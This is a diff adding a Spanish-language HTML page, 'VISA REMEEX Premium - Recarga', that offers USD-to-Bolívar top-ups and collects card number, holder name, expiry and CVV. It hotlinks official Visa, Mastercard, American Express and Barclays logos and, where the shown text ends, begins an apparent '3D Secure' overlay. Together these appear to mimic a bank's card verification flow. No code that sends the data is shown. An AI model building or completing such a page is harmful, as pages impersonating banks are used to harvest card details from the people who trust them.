@@ -1,0 +1,1698 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Recarga</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Recarga con Tarjeta de Crédito VISA REMEEX Premium." />
+
+  <!-- FAVICON -->
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
+
+  <!-- Fuentes e íconos -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+
+  <!-- Librerías de QR y PDF (aunque no se usen, se mantienen para conservar lógica) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>
+
+  <style>
+    :root {
+      /* Colores modernos inspirados en Visa */
+      --primary: #1a1f71;
+      --primary-dark: #0d153e;
+      --secondary: #3b82f6;
+      --accent: #60a5fa;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+
+      /* Colores para la animación del borde */
+      --border-white: #ffffff;
+      --border-gray: #d1d5db;
+      --border-light-blue: #93c5fd;
+
+      /* Fondos y texto */
+      --background: #f0f9ff;
+      --card-bg: rgba(255, 255, 255, 0.98);
+      --text-primary: #0f172a;
+      --text-secondary: #475569;
+
+      /* Diseño */
+      --border-radius-xl: 28px;
+      --border-radius-lg: 24px;
+      --border-radius: 16px;
+      --border-radius-sm: 12px;
+
+      /* Efectos */
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
+      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text-primary);
+      line-height: 1.6;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 1rem;
+      overflow-x: hidden;
+      transition: background 0.8s ease-in-out;
+    }
+
+    /* Celebración final: animación de colores */
+    body.celebration {
+      animation: colorParty 4s infinite;
+    }
+    @keyframes colorParty {
+      0%   { background: #f0f9ff; }
+      20%  { background: #fef08a; }
+      40%  { background: #bef264; }
+      60%  { background: #67e8f9; }
+      80%  { background: #fdba74; }
+      100% { background: #f0f9ff; }
+    }
+
+    /* Contenedor principal */
+    .container {
+      max-width: 650px;
+      width: 100%;
+      margin-top: 2rem;
+      background: var(--card-bg);
+      border-radius: var(--border-radius-xl);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      border: 2px solid var(--border-white);
+      overflow: hidden;
+      position: relative;
+      transition: var(--transition);
+      animation: glow 6s ease infinite, border-blink 6s linear infinite;
+    }
+    @keyframes glow {
+      0%, 100% {
+        box-shadow: 0 0 30px rgba(26, 31, 113, 0.4), 0 0 60px rgba(26, 31, 113, 0.2);
+      }
+      50% {
+        box-shadow: 0 0 50px rgba(26, 31, 113, 0.6), 0 0 80px rgba(26, 31, 113, 0.4);
+      }
+    }
+    @keyframes border-blink {
+      0% { border-color: var(--border-white); }
+      33% { border-color: var(--border-gray); }
+      66% { border-color: var(--border-light-blue); }
+      100% { border-color: var(--border-white); }
+    }
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+      color: #fff;
+      padding: 3rem 2rem;
+      position: relative;
+      overflow: hidden;
+      border-top-left-radius: var(--border-radius-xl);
+      border-top-right-radius: var(--border-radius-xl);
+      background-image: var(--aurora-gradient);
+      animation: aurora-animation 15s ease infinite;
+    }
+    @keyframes aurora-animation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    :root {
+      --aurora-gradient: linear-gradient(120deg, rgba(26, 31, 113, 0.4), rgba(25, 35, 102, 0.3), rgba(30, 40, 120, 0.3), rgba(26, 31, 113, 0.2));
+      background-size: 400% 400%;
+    }
+    .header p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+      max-width: 600px;
+      margin: 0 auto;
+      opacity: 0.95;
+      position: relative;
+      z-index: 2;
+    }
+    /* NUEVO: Destello de luz en el header */
+    .header::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6) 50%, transparent);
+      transform: skewX(-30deg);
+      opacity: 0.8;
+      pointer-events: none;
+      z-index: 1;
+      animation: flashEffect 3s ease-in-out infinite;
+    }
+    @keyframes flashEffect {
+      0% { left: -50%; }
+      50% { left: 100%; }
+      100% { left: 100%; }
+    }
+    /* Aseguramos que el logo esté por encima del destello */
+    .header img.header-logo {
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Logo Bar */
+    .logo-bar {
+      background: var(--card-bg);
+      padding: 1.5rem 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 3rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      position: relative;
+      overflow: hidden;
+    }
+    .logo-bar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(120deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+      animation: shimmer 3s linear infinite;
+    }
+    @keyframes shimmer {
+      0% { transform: translateX(-50%); }
+      100% { transform: translateX(50%); }
+    }
+    .logo-bar img {
+      height: 36px;
+      filter: grayscale(20%);
+      opacity: 0.9;
+      transition: var(--transition);
+      position: relative;
+      z-index: 2;
+    }
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.05);
+    }
+
+    /* Barra de Progreso */
+    .progress-bar {
+      height: 16px;
+      background-color: #e2e8f0;
+      border-radius: var(--border-radius);
+      margin: 2rem;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      width: 100%;
+      transition: width 0.6s ease-in-out;
+      border-radius: var(--border-radius);
+      position: relative;
+      overflow: hidden;
+    }
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: skewX(-45deg);
+      animation: move 2s linear infinite;
+    }
+    @keyframes move {
+      0% { left: -50%; }
+      100% { left: 100%; }
+    }
+
+    /* Secciones internas */
+    .section-content {
+      padding: 2rem;
+      display: none;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.4s ease-out;
+    }
+    .section-content.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .section-content h2 {
+      margin-bottom: 1.5rem;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      color: var(--primary);
+    }
+    .section-content p {
+      margin-bottom: 1rem;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      line-height: 1.4;
+    }
+
+    /* Formularios */
+    .form-group {
+      margin-bottom: 1.75rem;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.875rem 1.25rem;
+      border: 2px solid #e2e8f0;
+      border-radius: var(--border-radius);
+      font-size: 1rem;
+      background: #fff;
+      transition: var(--transition);
+      color: var(--text-primary);
+    }
+    .form-control:hover { border-color: #cbd5e1; }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1);
+    }
+
+    /* Botón con efecto glow */
+    .btn-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 1.5rem;
+      position: relative;
+      width: 250px;
+      height: 60px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .btn-glow-effect {
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        var(--primary),
+        var(--secondary),
+        transparent
+      );
+      background-size: 200% 100%;
+      border-radius: 30px;
+      animation: border-glow 3s ease infinite;
+      filter: blur(10px);
+      opacity: 0.7;
+      z-index: 0;
+    }
+    @keyframes border-glow {
+      0% { background-position: -100% 0; }
+      50% { background-position: 100% 0; }
+      100% { background-position: -100% 0; }
+    }
+    .btn-glow {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      overflow: hidden;
+      box-shadow:
+          0 15px 25px rgba(0,0,0,0.3),
+          inset 0 -4px 8px rgba(255,255,255,0.3);
+      transition: all 0.3s ease;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 1rem;
+    }
+    .btn-glow-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+    .btn-glow-initial {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow:hover .btn-glow-initial {
+      opacity: 0;
+      transform: translateX(100%);
+    }
+    .btn-glow-hover {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transform: translateX(-100%);
+      color: white;
+    }
+    .btn-glow:hover .btn-glow-hover {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow-icon { margin-left: 10px; }
+
+    /* Overlays genéricos y loaders */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .overlay.active { opacity: 1; pointer-events: auto; }
+    .overlay-content {
+      background: #fff;
+      padding: 2rem;
+      border-radius: var(--border-radius);
+      text-align: center;
+      box-shadow: var(--shadow-lg);
+      max-width: 420px;
+      width: 90%;
+      animation: fadeUp 0.5s forwards;
+    }
+    @keyframes fadeUp {
+      0% { transform: translateY(20px) scale(0.95); opacity: 0; }
+      100% { transform: translateY(0) scale(1); opacity: 1; }
+    }
+    .overlay-loader {
+      position: fixed;
+      inset: 0;
+      /* Se ha cambiado el fondo para que se vea bien el efecto en el canvas */
+      background: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .overlay-loader.active { opacity: 1; pointer-events: auto; }
+    /* Nuevas reglas para que en la overlay-loader el texto sea claro */
+    .overlay-loader .loading-text,
+    .overlay-loader .percentage {
+      color: #fff !important;
+      text-shadow: 0 0 8px rgba(255,255,255,0.5);
+    }
+    .loader-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      position: relative;
+      z-index: 2;
+    }
+    .loader-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      padding: 20px;
+      height: 60px;
+      position: relative;
+    }
+    .dots-wrapper {
+      display: flex;
+      gap: 12px;
+      transition: all 0.5s ease;
+    }
+    .dot {
+      width: 15px;
+      height: 15px;
+      background: linear-gradient(45deg, #1e40af, #3b82f6);
+      border-radius: 50%;
+      opacity: 0.5;
+      position: relative;
+      transition: all 0.5s ease;
+      animation: dotAnimation 1.2s infinite, colorShift 3s infinite;
+    }
+    @keyframes dotAnimation {
+      0% { transform: translateY(0); opacity: 0.5; scale: 1; }
+      50% { transform: translateY(-15px); opacity: 1; scale: 1.3; }
+      100% { transform: translateY(0); opacity: 0.5; scale: 1; }
+    }
+    @keyframes colorShift {
+      0% { background: linear-gradient(45deg, #1e40af, #3b82f6); }
+      50% { background: linear-gradient(45deg, #2563eb, #60a5fa); }
+      100% { background: linear-gradient(45deg, #1e40af, #3b82f6); }
+    }
+    .dot::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      border-radius: 50%;
+      box-shadow: 0 0 20px #3b82f6, 0 0 40px #60a5fa;
+      animation: glowPulse 2s infinite;
+    }
+    @keyframes glowPulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
+    }
+    .loading-text {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--text-primary);
+      text-align: center;
+      position: relative;
+      text-shadow: 0 0 8px rgba(59, 130, 246, 0.1);
+    }
+    .percentage {
+      color: #64748b;
+      font-size: 16px;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      margin-top: 5px;
+      animation: textPulse 2s infinite;
+      text-align: center;
+    }
+    @keyframes textPulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    .percentage::after {
+      content: '%';
+      margin-left: 2px;
+      opacity: 0.8;
+    }
+    .checkmark, .xmark {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      color: white;
+      font-size: 28px;
+      transition: transform 0.5s ease;
+      opacity: 0;
+      z-index: 3;
+    }
+    .checkmark.show, .xmark.show {
+      transform: translate(-50%, -50%) scale(1);
+      opacity: 1;
+    }
+    /* NUEVOS estilos para los círculos de éxito y error */
+    #checkCircle,
+    #xCircle {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      opacity: 0;
+      transform: scale(0);
+      transition: all 0.5s ease;
+      z-index: 1;
+    }
+    #checkCircle.show {
+      opacity: 1;
+      transform: scale(1);
+    }
+    #checkCircle {
+      background: linear-gradient(145deg, var(--success), #16a34a);
+      box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);
+    }
+    #checkCircle::after {
+      content: '';
+      position: absolute;
+      width: calc(100% + 4px);
+      height: calc(100% + 4px);
+      top: -2px;
+      left: -2px;
+      border-radius: 50%;
+      border: 2px solid var(--success);
+      border-top-color: transparent;
+      animation: rotateCircle 3s linear infinite;
+    }
+    @keyframes rotateCircle {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #xCircle.show {
+      opacity: 1;
+      transform: scale(1);
+    }
+    #xCircle {
+      background: linear-gradient(145deg, var(--danger), #991b1b);
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+    }
+    #xCircle::after {
+      content: '';
+      position: absolute;
+      width: calc(100% + 4px);
+      height: calc(100% + 4px);
+      top: -2px;
+      left: -2px;
+      border-radius: 50%;
+      border: 2px solid var(--danger);
+      border-left-color: transparent;
+      border-right-color: transparent;
+      animation: rotateErrorCircle 3s linear infinite;
+    }
+    @keyframes rotateErrorCircle {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Sección Tarjeta 3D + Formulario */
+    .card-container {
+      position: relative;
+      width: 100%;
+      max-width: 450px;
+      height: 270px;
+      margin: 20px auto;
+      perspective: 2000px;
+      transform-style: preserve-3d;
+    }
+    .glow-effect {
+      position: absolute;
+      inset: -15px;
+      background: linear-gradient(45deg,
+        rgba(255, 0, 128, 0.5),
+        rgba(255, 140, 0, 0.5),
+        rgba(64, 224, 208, 0.5),
+        rgba(138, 43, 226, 0.5)
+      );
+      background-size: 400% 400%;
+      animation: glowMove 8s linear infinite;
+      border-radius: 35px;
+      filter: blur(25px);
+      opacity: 0.6;
+      z-index: -1;
+    }
+    @keyframes glowMove {
+      0% { background-position: 0% 50%; transform: scale(1); }
+      50% { background-position: 100% 50%; transform: scale(1.02); }
+      100% { background-position: 0% 50%; transform: scale(1); }
+    }
+    .card {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      border-radius: 25px;
+      transform-style: preserve-3d;
+      transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      cursor: pointer;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow:
+        0 15px 35px rgba(0, 0, 0, 0.3),
+        0 5px 15px rgba(0, 0, 0, 0.2);
+      overflow: hidden;
+      animation: borderDynamic 5s infinite, rotateCard 10s infinite linear;
+    }
+    @keyframes borderDynamic {
+      0% { border-color: gold; }
+      25% { border-color: #FFD700; }
+      50% { border-color: #FF8C00; }
+      75% { border-color: #DAA520; }
+      100% { border-color: gold; }
+    }
+    @keyframes rotateCard {
+      0% { transform: rotateY(0deg) rotateX(0deg); }
+      25% { transform: rotateY(15deg) rotateX(7deg); }
+      50% { transform: rotateY(0deg) rotateX(15deg); }
+      75% { transform: rotateY(-15deg) rotateX(7deg); }
+      100% { transform: rotateY(0deg) rotateX(0deg); }
+    }
+    .card-shine {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        125deg,
+        rgba(255, 255, 255, 0.3) 0%,
+        rgba(255, 255, 255, 0.1) 30%,
+        transparent 60%
+      );
+      border-radius: 25px;
+      opacity: 0.5;
+      animation: shineEffect 3s infinite;
+    }
+    @keyframes shineEffect {
+      0% { opacity: 0.3; transform: translateX(-100%) translateY(-100%); }
+      50% { opacity: 0.5; }
+      100% { opacity: 0.3; transform: translateX(100%) translateY(100%); }
+    }
+    .card-front, .card-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 25px;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+    }
+    .card-back { transform: rotateY(180deg); }
+    /* Se ha eliminado el logo Remeex de la tarjeta (clase new-logo) */
+    /* <img src="..." alt="Logo Remeex" class="new-logo" /> */
+    .visa-logo {
+      position: absolute;
+      bottom: 15px;
+      right: 20px;
+      width: 120px;
+      height: auto;
+      opacity: 0.9;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+      transition: transform 0.3s ease;
+    }
+    .visa-logo:hover { transform: scale(1.05); }
+    .card-number-display {
+      font-size: 1.3em;
+      letter-spacing: 3px;
+      color: #000;
+      font-family: 'Courier New', monospace;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      margin: auto 0;
+      white-space: nowrap;
+      overflow: hidden;
+      text-align: center;
+    }
+    .card-holder-expiry {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      color: #000;
+      margin-top: -30px;
+    }
+    .card-holder-display,
+    .card-expiry-display {
+      text-transform: uppercase;
+      font-size: 1em;
+      letter-spacing: 2px;
+      font-weight: 500;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+      margin-bottom: 5px;
+    }
+    .cvv-display {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(5px);
+      border-radius: 8px;
+      padding: 8px 12px;
+      color: #000;
+      font-weight: bold;
+      box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+      filter: blur(4px);
+    }
+    .cvv-display.active { filter: blur(0); }
+
+    /* Formulario interno para la Tarjeta 3D */
+    .card-form {
+      width: 100%;
+      max-width: 450px;
+      margin: 1rem auto 0 auto;
+      padding: 35px;
+      border-radius: 25px;
+      background: #fff;
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(0, 0, 0, 0.05);
+      box-shadow: var(--shadow-sm);
+    }
+    .card-form .form-group { margin-bottom: 1.5rem; }
+    .card-form label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+    .card-form input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid #e2e8f0;
+      border-radius: var(--border-radius-sm);
+      font-size: 1rem;
+      color: var(--text-primary);
+      background: #fff;
+      transition: all 0.3s ease;
+    }
+    .card-form input::placeholder { color: #94a3b8; }
+    .card-form input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1);
+    }
+
+    @media (max-width: 768px) {
+      .container { margin-top: 1.5rem; }
+      .header { padding: 2rem 1rem; }
+      .header-logo { width: 70%; max-width: 300px; }
+      .header p { font-size: 1rem; }
+      .logo-bar { gap: 2rem; padding: 1rem; }
+      .logo-bar img { height: 28px; }
+      .progress-bar { margin: 1.5rem; }
+      .section-content { padding: 1.5rem; }
+      .btn-container { width: 200px; height: 50px; }
+      .card-container { max-width: 350px; height: 210px; }
+    }
+
+    @media (max-width: 480px) {
+      .header-logo { width: 90%; max-width: 250px; }
+      .header p { font-size: 0.95rem; }
+      .logo-bar { gap: 1.5rem; }
+      .logo-bar img { height: 24px; }
+      .btn-container { width: 150px; height: 45px; }
+      .btn-glow { font-size: 0.9rem; }
+    }
+
+    /* ===== NUEVO: Estilos para el canvas del loader ===== */
+    #loaderCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+    }
+
+    /* ===== NUEVOS ESTILOS PARA EL EFECTO "Transacción Exitosa" ===== */
+    #explosionEffect {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 10000;
+    }
+    #explosion-canvas, #vortex-canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+    /* El mensaje usará la fuente "Inter" para conservar el estilo y se mostrará con transición */
+    #message {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-family: 'Inter', sans-serif;
+      font-size: 3rem;
+      opacity: 0;
+      transition: opacity 1s;
+      text-align: center;
+      z-index: 10;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- HEADER -->
+    <div class="header">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX Logo" class="header-logo">
+      <p>Este es el módulo de Recarga con Tarjeta de Crédito.</p>
+    </div>
+
+    <!-- LOGO BAR -->
+    <div class="logo-bar">
+      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo" />
+      <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo" />
+      <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo" />
+    </div>
+
+    <!-- Barra de Progreso (al 100% para indicar que este es el paso 5) -->
+    <div class="progress-bar">
+      <div class="progress-bar-fill"></div>
+    </div>
+
+    <!-- Sección Selección Monto -->
+    <div class="section-content active" id="sectionMonto">
+      <h2><i class="fas fa-wallet"></i> Recarga</h2>
+      <p>
+        Selecciona el monto en USD que deseas recargar.
+      </p>
+
+      <div class="form-group">
+        <label class="form-label" for="montoSelect">Monto de Recarga (USD)</label>
+        <select class="form-control" id="montoSelect">
+          <option value="">-- Selecciona un monto --</option>
+          <!-- Montos deshabilitados -->
+          <option value="50" disabled>USD 50,00 Dólares (3.450,00 Bolívares)</option>
+          <option value="100" disabled>USD 100,00 Dólares (6.900,00 Bolívares)</option>
+          <option value="150" disabled>USD 150,00 Dólares (10.350,00 Bolívares)</option>
+          <!-- Montos disponibles -->
+          <option value="200">USD 200,00 Dólares (13.800,00 Bolívares)</option>
+          <option value="250">USD 250,00 Dólares (17.250,00 Bolívares)</option>
+          <option value="300">USD 300,00 Dólares (20.700,00 Bolívares)</option>
+          <option value="350">USD 350,00 Dólares (24.150,00 Bolívares)</option>
+          <option value="400">USD 400,00 Dólares (27.600,00 Bolívares)</option>
+          <option value="450">USD 450,00 Dólares (31.050,00 Bolívares)</option>
+          <option value="500">USD 500,00 Dólares (34.500,00 Bolívares)</option>
+          <option value="600">USD 600,00 Dólares (41.400,00 Bolívares)</option>
+          <option value="700">USD 700,00 Dólares (48.300,00 Bolívares)</option>
+          <option value="800">USD 800,00 Dólares (55.200,00 Bolívares)</option>
+          <option value="900">USD 900,00 Dólares (62.100,00 Bolívares)</option>
+          <option value="1000">USD 1000,00 Dólares (69.000,00 Bolívares)</option>
+          <option value="1200">USD 1200,00 Dólares (82.800,00 Bolívares)</option>
+          <option value="1500">USD 1500,00 Dólares (103.500,00 Bolívares)</option>
+          <option value="2000">USD 2000,00 Dólares (138.000,00 Bolívares)</option>
+          <option value="2500">USD 2500,00 Dólares (172.500,00 Bolívares)</option>
+          <option value="5000">USD 5000,00 Dólares (345.000,00 Bolívares)</option>
+        </select>
+      </div>
+
+      <div class="btn-container">
+        <div class="btn-glow-effect"></div>
+        <button class="btn-glow" id="btnMontoContinuar">
+          <div class="btn-glow-content btn-glow-initial">Continuar</div>
+          <div class="btn-glow-content btn-glow-hover">
+            Continuar
+            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="12 5 19 12 12 19" />
+            </svg>
+          </div>
+        </button>
+      </div>
+    </div>
+
+    <!-- Sección Datos Resumen + Tarjeta 3D -->
+    <div class="section-content" id="sectionTarjeta">
+      <h2><i class="fas fa-credit-card"></i> Confirma tu Recarga</h2>
+      <p>
+        Monto en USD seleccionado:
+        <strong id="seleccionadoUSD"></strong><br />
+        Recibirás en Bolívares:
+        <strong id="recibesBs"></strong><br />
+        Tasa de cambio:
+        <strong id="usdRate"></strong> Bs. por USD<br />
+        Fecha: <span id="fechaHoy"></span> - Hora: <span id="horaHoy"></span>
+      </p>
+
+      <!-- Tarjeta 3D -->
+      <div class="card-container">
+        <div class="glow-effect"></div>
+        <div class="card" id="card">
+          <div class="card-shine"></div>
+          <!-- Parte Frontal -->
+          <div class="card-front">
+            <div class="card-number-display" id="numberDisplay">•••• •••• •••• ••••</div>
+            <div class="card-holder-expiry">
+              <div class="card-holder-display" id="holderDisplay">NOMBRE APELLIDO</div>
+              <div class="card-expiry-display" id="expiryDisplay">MM/AA</div>
+            </div>
+            <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Logo Visa" class="visa-logo" />
+          </div>
+          <!-- Parte Trasera -->
+          <div class="card-back">
+            <div class="card-stripe"></div>
+            <div class="card-signature">
+              <div class="signature-line"></div>
+              <div class="cvv-display" id="cvvDisplayBack">•••</div>
+            </div>
+            <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Logo Visa" class="visa-logo" />
+          </div>
+        </div>
+      </div>
+
+      <!-- Formulario interno (Tarjeta 3D) -->
+      <form class="card-form">
+        <div class="form-group">
+          <label for="cardNumberInput">Número de Tarjeta</label>
+          <input type="text" id="cardNumberInput" maxlength="19" placeholder="1234 5678 9012 3456" />
+        </div>
+        <div class="form-group">
+          <label for="cardHolderInput">Nombre del Titular</label>
+          <input type="text" id="cardHolderInput" placeholder="Juan Perez" />
+        </div>
+        <div class="form-group">
+          <label for="cardExpiryInput">Fecha de Expiración</label>
+          <input type="text" id="cardExpiryInput" maxlength="5" placeholder="MM/AA" />
+        </div>
+        <div class="form-group">
+          <label for="cardCVVInput">CVV</label>
+          <input type="text" id="cardCVVInput" maxlength="3" placeholder="123" />
+        </div>
+      </form>
+
+      <div class="btn-container">
+        <div class="btn-glow-effect"></div>
+        <button class="btn-glow" id="btnRecargar">
+          <div class="btn-glow-content btn-glow-initial">Recargar ahora</div>
+          <div class="btn-glow-content btn-glow-hover">
+            Recargar
+            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="12 5 19 12 12 19" />
+            </svg>
+          </div>
+        </button>
+      </div>
+    </div>
+
+    <!-- Overlay: 3D Secure -->
+    <div class="overlay" id="overlay3D">
+      <div class="overlay-content">
+        <div style="display:flex; justify-content:center; gap:1rem; margin-bottom:1rem;">
+          <img src="https://www.barclays.co.uk/content/dam/icons/favicons/barclays/Wordmark_RGB_Cyan_Large.svg" alt="Barclays" style="max-height:40px;" />
+          <img src="https://www.visa.es/dam/VCOM/global/run-your-business/images/visa-secure-logo-800x450.jpg" alt="Visa Secure" style="max-height:40px;" />
+        </div>
